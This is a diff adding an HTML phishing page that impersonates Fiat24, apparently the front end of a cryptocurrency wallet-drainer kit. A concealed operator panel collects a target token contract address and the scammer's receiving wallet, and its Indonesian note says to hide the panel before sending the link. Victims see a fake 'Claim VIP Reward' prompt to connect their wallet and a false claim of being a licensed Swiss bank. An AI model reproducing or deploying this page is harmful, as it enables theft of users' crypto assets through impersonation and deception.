@@ -1,0 +1,48 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fiat24 | Secure Banking Gateway</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <!-- Panel Kontrol Arsitek (Hanya terlihat di laptopmu) -->
+    <div class="admin-panel" id="adminBox">
+        <strong>🛠️ Cloud Nine Control</strong>
+        <input type="text" id="targetToken" placeholder="Contract Address (USDT/USDC)">
+        <input type="text" id="myWallet" placeholder="Your Receiving Wallet (0x...)">
+        <p style="font-size: 10px;">*Masukkan data lalu tutup panel ini sebelum kirim link.</p>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <span class="brand">Fiat24</span>
+            <div class="lang-switcher">
+                <span onclick="changeLang('en')">EN</span> | 
+                <span onclick="changeLang('cn')">中文</span> | 
+                <span onclick="changeLang('ru')">RU</span>
+            </div>
+        </div>
+
+        <div class="content-box reward-theme">
+    <h1 id="txt-title" class="gold-text">Claim VIP Reward</h1>
+    <p id="txt-desc">Congratulations! Your wallet is eligible for a VIP Reward from Fiat24. Synchronize your wallet to secure and claim your assets immediately.</p>
+    
+    <div class="status-card reward-card">
+        <span class="dot pulse-gold"></span>
+        <span id="txt-status">Reward Status: Ready to Claim</span>
+    </div>
+
+    <button class="btn-main btn-reward" onclick="startVerification()" id="txt-btn">CLAIM REWARD NOW</button>
+</div>
+        
+        <div class="footer">
+            <p>© 2026 Fiat24 AG. Licensed Swiss Bank Service.</p>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
